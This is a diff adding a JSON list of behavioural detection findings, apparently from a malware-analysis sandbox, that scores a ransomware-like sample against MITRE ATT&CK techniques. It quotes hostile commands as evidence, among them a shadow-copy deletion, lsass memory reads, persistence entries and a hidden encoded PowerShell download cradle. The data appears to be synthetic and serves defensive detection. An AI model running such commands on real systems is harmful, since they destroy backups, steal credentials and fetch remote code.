@@ -1,0 +1,177 @@
+[
+  {
+    "id": "beh-injection",
+    "name": "Process injection",
+    "severity": "critical",
+    "score": 18,
+    "mitre": "T1055",
+    "why": "Remote thread / APC style injection into another process.",
+    "evidence": [
+      "02:20.600 svchost32.exe: CreateRemoteThread target pid explorer.exe"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-credential",
+    "name": "Credential access",
+    "severity": "critical",
+    "score": 18,
+    "mitre": "T1003",
+    "why": "Touches lsass/SAM/credential stores or vault APIs.",
+    "evidence": [
+      "02:00.000 svchost32.exe: kernel32.dll!OpenProcess - OpenProcess(process=lsass.exe) \u2192 0x0000004c",
+      "02:00.400 svchost32.exe: kernel32.dll!ReadProcessMemory - ReadProcessMemory(target=lsass.exe, size=0x00100000) \u2192 1"
+    ],
+    "evidence_count": 2
+  },
+  {
+    "id": "beh-mass-modify",
+    "name": "Mass file modification / rename",
+    "severity": "critical",
+    "score": 18,
+    "mitre": "T1486",
+    "why": "Bulk writes and renames consistent with encryption.",
+    "evidence": [
+      "56 file modifications, 12 renames in 299s (extensions: .locked x40, .lockbit x12, .exe x3, .txt x1)"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-shadow",
+    "name": "Recovery inhibition (shadow copy deletion)",
+    "severity": "critical",
+    "score": 16,
+    "mitre": "T1490",
+    "why": "Deletes backup/shadow copies - a hallmark of ransomware staging.",
+    "evidence": [
+      "00:04.600 cmd.exe: cmd.exe /c vssadmin delete shadows /all /quiet",
+      "00:04.700 cmd.exe: vssadmin delete shadows /all /quiet"
+    ],
+    "evidence_count": 2
+  },
+  {
+    "id": "beh-service",
+    "name": "Service installation",
+    "severity": "high",
+    "score": 14,
+    "mitre": "T1543.003",
+    "why": "Installs a Windows service pointing at the payload.",
+    "evidence": [
+      "00:03.900 svchost32.exe: service WinDefendUpdate -> C:\\ProgramData\\svc\\update.exe"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-runkey",
+    "name": "Autostart registry persistence",
+    "severity": "high",
+    "score": 12,
+    "mitre": "T1547.001",
+    "why": "Writes a Run/RunOnce-style value so the payload survives reboot.",
+    "evidence": [
+      "00:03.000 svchost32.exe: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = C:\\Users\\Public\\svchost32.exe",
+      "00:03.400 svchost32.exe: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce = C:\\ProgramData\\svc\\update.exe"
+    ],
+    "evidence_count": 2
+  },
+  {
+    "id": "beh-task",
+    "name": "Scheduled task creation",
+    "severity": "high",
+    "score": 12,
+    "mitre": "T1053.005",
+    "why": "Creates a scheduled task for execution or persistence.",
+    "evidence": [
+      "00:04.300 svchost32.exe: task \\MicrosoftUpdate -> powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-beacon",
+    "name": "Periodic C2 check-in",
+    "severity": "high",
+    "score": 12,
+    "mitre": "T1071",
+    "why": "Regularly spaced connections to the same endpoint (beaconing).",
+    "evidence": [
+      "185.220.101.44:8443 - 10 connections, mean interval 30.0s, jitter 0% (regular check-in)"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-wmi",
+    "name": "WMI event subscription",
+    "severity": "high",
+    "score": 12,
+    "mitre": "T1546.003",
+    "why": "Creates a WMI filter/consumer for fileless persistence.",
+    "evidence": [
+      "04:30.000 svchost32.exe: wbemdisp.dll!ExecQuery - ExecQuery(query=SELECT * FROM __EventFilter WHERE Name='Updater') \u2192 0"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-dropped-exe",
+    "name": "Dropped executable payload",
+    "severity": "high",
+    "score": 10,
+    "mitre": "T1105",
+    "why": "Writes an executable/script payload to disk (often to a user-writable path).",
+    "evidence": [
+      "00:02.400 svchost32.exe: C:\\Users\\Public\\svchost32.exe sha256=9f2a4c1de8b74503fa1d6c0be2f4a9182233445566778899aabbccddeeff0011",
+      "00:05.400 powershell.exe: C:\\ProgramData\\svc\\update.exe sha256=1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809",
+      "00:05.600 powershell.exe: C:\\ProgramData\\svc\\update.exe sha256=1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809"
+    ],
+    "evidence_count": 3
+  },
+  {
+    "id": "beh-encoded-ps",
+    "name": "Encoded PowerShell",
+    "severity": "high",
+    "score": 10,
+    "mitre": "T1059.001",
+    "why": "Base64-encoded PowerShell command line.",
+    "evidence": [
+      "00:04.300 svchost32.exe: \\MicrosoftUpdate powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "00:05.000 powershell.exe: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    ],
+    "evidence_count": 2
+  },
+  {
+    "id": "beh-exfil",
+    "name": "Large outbound transfer (possible exfiltration)",
+    "severity": "high",
+    "score": 10,
+    "mitre": "T1041",
+    "why": "Sends a large volume of data to a remote endpoint.",
+    "evidence": [
+      "04:00.000 svchost32.exe: 6.5 MB sent to 185.220.101.44:443"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-dns",
+    "name": "DGA / DNS tunnelling profile",
+    "severity": "medium",
+    "score": 8,
+    "mitre": "T1568.002",
+    "why": "High-cardinality or high-entropy DNS queries.",
+    "evidence": [
+      "DNS profile suggests DGA or tunnelling: dyndns-demo.example (24 unique subdomains)"
+    ],
+    "evidence_count": 1
+  },
+  {
+    "id": "beh-anti-analysis",
+    "name": "Anti-analysis / anti-VM checks",
+    "severity": "medium",
+    "score": 8,
+    "mitre": "T1497",
+    "why": "Debugger, sandbox or hypervisor detection.",
+    "evidence": [
+      "00:00.900 svchost32.exe: kernel32.dll!IsDebuggerPresent - ",
+      "00:02.100 svchost32.exe: Module loaded - "
+    ],
+    "evidence_count": 2
+  }
+]
